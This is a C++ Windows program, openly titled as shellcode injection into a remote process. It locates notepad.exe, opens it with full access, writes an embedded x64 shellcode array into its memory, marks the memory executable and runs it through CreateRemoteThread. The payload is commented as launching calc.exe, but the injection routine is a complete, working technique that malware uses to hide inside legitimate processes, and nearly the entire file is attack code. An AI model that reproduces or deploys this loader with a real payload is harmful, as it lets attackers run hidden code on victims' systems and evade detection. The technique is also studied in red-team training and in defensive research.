//shellcode injection to a remote process
//

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>



BOOL GetRemoteProcessHandle(IN LPCWSTR ProcessName, OUT DWORD* ProcessId, OUT HANDLE* Process) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot() failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!Process32First(snapshot, &entry)) {
        printf("[!] Process32First() failed: %d\n", GetLastError());
        CloseHandle(snapshot);
        return FALSE;
    }

    do {
        if (_wcsicmp(entry.szExeFile, ProcessName) == 0) { // Case-insensitive comparison
            printf("[+] ProcessName: %ws\n", entry.szExeFile);
            *ProcessId = entry.th32ProcessID;
            *Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
            if (*Process == NULL) {
                printf("[!] OpenProcess() failed: %d\n", GetLastError());
                CloseHandle(snapshot);
                return FALSE;
            }
            CloseHandle(snapshot);
            return TRUE;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return FALSE;
}

BOOL RemoteInjectShellcode(IN HANDLE process, IN unsigned char* shellcode, IN SIZE_T shellcodeSize) {


    LPVOID remotebuffer = NULL;
    remotebuffer = VirtualAllocEx(process, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remotebuffer == NULL) {
        printf("[!] VirtualAllocEx() failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Remote buffer allocated at: 0x%p\n", remotebuffer);


    if (!WriteProcessMemory(process, remotebuffer, shellcode, shellcodeSize, NULL)) {
        printf("[!] WriteProcessMemory() failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Shellcode written to remote process\n");

    DWORD oldProtect;
    if (!VirtualProtectEx(process, remotebuffer, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[!] VirtualProtectEx() failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Shellcode memory protection changed to PAGE_EXECUTE_READ\n");

    HANDLE remotethread = CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)remotebuffer, NULL, NULL, NULL);
    if (remotethread == NULL) {
        printf("[!] CreateRemoteThread() failed: %d\n", GetLastError());
        VirtualFreeEx(process, remotebuffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    printf("[+] Remote thread created\n");

    WaitForSingleObject(process, INFINITE);

    CloseHandle(remotethread);
    VirtualFreeEx(process, remotebuffer, 0, MEM_RELEASE);
    CloseHandle(process);


    return TRUE;
}


int main() {
    HANDLE hProcess = NULL;
    DWORD ProcessId = 0;
    //calc.exe shellcode
    unsigned char  shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };

    SIZE_T shellcodeSize = sizeof(shellcode);


    if (GetRemoteProcessHandle(L"notepad.exe", &ProcessId, &hProcess)) {
        printf("[+] Found ProcessId: %d\n", ProcessId);
    }
    else {
        printf("[!] GetRemoteProcessHandle() failed\n");
    }

    if (!RemoteInjectShellcode(hProcess, shellcode, shellcodeSize)) {
        return -1;
    }
    getchar();
    return 0;
}

